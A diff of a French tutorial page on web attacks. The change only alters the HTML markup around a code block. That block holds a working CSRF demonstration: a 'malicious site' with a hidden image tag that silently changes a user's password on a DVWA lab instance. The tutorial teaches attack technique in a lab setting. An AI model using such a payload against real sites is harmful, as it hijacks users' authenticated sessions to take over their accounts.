@@ -2044,7 +2044,7 @@
 <p>Avec le CSRF, nous utilisons la session déjà authentifiée d'un utilisateur pour effectuer des actions malicieuses.  </p>
 <p>Voici donc une façon d'utiliser la session d'un utilisateur à son insu.  </p>
 <p>Créons une page avec le code suivant :  </p>
-<pre><code>&lt;!DOCTYPE html&gt;
+<div class="highlight"><pre><span></span><code>&lt;!DOCTYPE html&gt;
  &lt;head&gt;
   &lt;title&gt;Site malicieux&lt;/title&gt;
  &lt;/head&gt;
@@ -2053,7 +2053,7 @@
   &lt;img style=&quot;display:none&quot; src=&quot;http://192.168.40.14/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=change&quot; alt=&quot;&quot;&gt;
  &lt;/body&gt;
 &lt;/html&gt;
-</code></pre>
+</code></pre></div>
 <p><img alt="19-csrf-site-malicieux" src="../../images/2020/11/19-csrf-site-malicieux.png" /></p>
 <p>En apparence, le site ne semble rien faire de grave. Regardons par contre les accès réseau de la page :  </p>
 <p><img alt="19-csrf-site-malicieux-reseau" src="../../images/2020/11/19-csrf-site-malicieux-reseau.png" /></p>
